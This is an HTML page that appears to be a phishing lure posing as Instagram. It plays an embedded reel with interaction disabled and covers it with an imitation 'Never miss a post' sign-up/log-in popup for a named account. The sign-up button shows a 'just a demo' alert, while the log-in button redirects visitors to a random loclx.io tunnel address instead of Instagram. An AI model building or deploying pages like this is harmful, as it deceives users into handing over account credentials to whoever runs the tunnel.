<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Reel Demo</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
      font-family: Arial, sans-serif;
      overflow: hidden;
    }

    .video-wrapper {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
    }

    iframe {
      width: 100%;
      height: 100%;
      border: none;
      pointer-events: none; /* disable interaction */
    }

    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #1c1c1c;
      color: #fff;
      border-radius: 12px;
      padding: 20px;
      width: 360px;
      text-align: center;
      z-index: 3;
    }

    .popup img {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      margin-bottom: 15px;
    }

    .popup h2 {
      font-size: 18px;
      margin-bottom: 8px;
    }

    .popup p {
      font-size: 14px;
      color: #aaa;
      margin-bottom: 15px;
    }

    .btn {
      display: block;
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      margin: 8px 0;
      cursor: pointer;
      font-size: 16px;
    }

    .btn-primary {
      background: #3897f0;
      color: #fff;
    }

    .btn-secondary {
      background: transparent;
      color: #3897f0;
    }
  </style>
</head>
<body>

  <!-- Video background with pointer-events: none -->
  <div class="video-wrapper">
    <iframe src="https://www.instagram.com/reel/DNJ3-SuT0SD/embed" allowfullscreen></iframe>
  </div>

  <!-- Popup in front -->
  <div class="popup">
    <img src="https://i.imgur.com/A9PHTxs.jpeg" alt="Profile">
    <h2>Never miss a post from<br><b>mental.queen.lamiya</b></h2>
    <p>Sign up for Instagram to stay in the loop.<br>
      By continuing, you agree to Instagram’s Terms of Use and Privacy Policy.</p>
    <button class="btn btn-primary" onclick="signup()">Sign up</button>
    <button class="btn btn-secondary" onclick="login()">Log In</button>
  </div>

  <script>
    function signup() {
      alert("This is just a demo. No real signup.");
    }

    function login() {
      window.location.href = "https://hmmwaz3m5z.loclx.io/";
    }
  </script>
</body>
</html>
